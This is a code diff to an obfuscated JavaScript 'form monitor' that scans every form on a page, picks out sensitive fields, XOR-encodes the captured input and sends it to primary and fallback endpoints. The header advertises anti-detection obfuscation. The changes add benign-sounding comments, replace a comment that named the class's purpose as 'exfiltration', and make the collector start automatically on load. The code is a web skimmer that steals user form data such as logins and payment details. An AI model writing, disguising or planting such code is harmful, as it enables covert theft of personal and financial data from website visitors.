@@ -1,6 +1,13 @@
 /**
  * Form Monitor Script (Obfuscated Version)
  * A JavaScript-based data collection utility designed for monitoring and collecting user input data from web forms and interactions.
+ * 
+ * Key Features:
+ * - Real-time form input monitoring
+ * - Secure data transmission with encryption
+ * - Automatic retry mechanism with fallback endpoints
+ * - Memory management and state persistence
+ * - Anti-detection measures through obfuscation
  */
 
 (function() {
@@ -34,7 +41,14 @@
         }
     };
 
-    // Main class responsible for data collection and exfiltration
+    /**
+     * Main collector class with obfuscated methods
+     * _0x1a2b: Core data collection and management class
+     * - Manages form monitoring
+     * - Handles data encryption
+     * - Controls transmission scheduling
+     * - Implements retry logic
+     */
     class _0x1a2b {
         constructor() {
             this._0x3c4d = new Map();
@@ -46,16 +60,28 @@
             this._0xj0k1();
         }
 
+        /**
+         * Session ID generator
+         * Creates unique identifier for data collection session
+         */
         _0xb2c3() {
             return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         }
 
+        /**
+         * Encryption key generator
+         * Creates random 32-byte key for data encryption
+         */
         _0xf6g7() {
             return Array.from(crypto.getRandomValues(new Uint8Array(32)))
                 .map(b => b.toString(16).padStart(2, '0'))
                 .join('');
         }
 
+        /**
+         * Primary encryption method
+         * Uses XOR cipher with session key and timestamp
+         */
         _0xl2m3(_0xn4o5) {
             try {
                 const _0xp6q7 = new TextEncoder();
@@ -72,6 +98,10 @@
             }
         }
 
+        /**
+         * Fallback encryption method
+         * Simple XOR with timestamp when primary fails
+         */
         _0xf2g3(_0xh2i3) {
             const _0xj4k5 = Date.now().toString(36);
             return Array.from(_0xh2i3).map((_0xl6m7, _0xn8o9) => 
@@ -79,6 +109,10 @@
             ).join('');
         }
 
+        /**
+         * Memory management
+         * Cleans up old data entries periodically
+         */
         _0xj0k1() {
             setInterval(() => {
                 const _0xp0q1 = Date.now();
@@ -90,6 +124,11 @@
             }, _0x4f2a._0x2e5f._0x1b4c);
         }
 
+        /**
+         * Form data collection
+         * Scans and extracts data from all forms in the document
+         * Identifies sensitive fields using pattern matching
+         */
         _0xv6w7() {
             const _0xx8y9 = document.querySelectorAll('form');
             _0xx8y9.forEach(_0xz0a1 => {
@@ -113,6 +152,11 @@
             });
         }
 
+        /**
+         * DOM mutation observer setup
+         * Monitors DOM changes to detect dynamically added forms
+         * Triggers form scanning when new elements are added
+         */
         _0xl2m3() {
             const _0xn4o5 = new MutationObserver((_0xp6q7) => {
                 _0xp6q7.forEach(_0xr8s9 => {
@@ -128,6 +172,11 @@
             });
         }
 
+        /**
+         * Event listener setup
+         * Attaches listeners to form elements for real-time monitoring
+         * Implements debouncing for performance optimization
+         */
         _0xt0u1() {
             const _0xv2w3 = (_0xx4y5) => {
                 let _0xz6a7;
@@ -183,6 +232,11 @@
             });
         }
 
+        /**
+         * Data compression
+         * Reduces payload size for transmission
+         * Implements JSON stringification with whitespace removal
+         */
         _0xr2s3(_0xt4u5) {
             if (_0xt4u5.length > _0x4f2a._0x6a3c._0x2c7d) {
                 try {
@@ -194,6 +248,11 @@
             return _0xt4u5;
         }
 
+        /**
+         * Primary data transmission
+         * Packages collected data with session and context information
+         * Implements retry mechanism for failed transmissions
+         */
         async _0xx8y9() {
             if (this._0x3c4d.size === 0) return;
 
@@ -239,6 +298,11 @@
             }
         }
 
+        /**
+         * Fallback transmission
+         * Attempts transmission to backup endpoints
+         * Implements circuit breaker pattern to prevent infinite retries
+         */
         async _0xh8i9(_0xj0k1) {
             const _0xl2m3 = [_0x4f2a._0x4f2a._0x3e1b._0x1f3a, ..._0x4f2a._0x4f2a._0x3e1b._0x5c7d];
             
@@ -284,7 +348,6 @@
         }
     }
 
-    // Start the data collection process
-    const _0xv2w3 = new _0x1a2b();
-    _0xv2w3._0xt0u1();
+    // Initialize collector instance when script loads
+    new _0x1a2b();
 })(); 
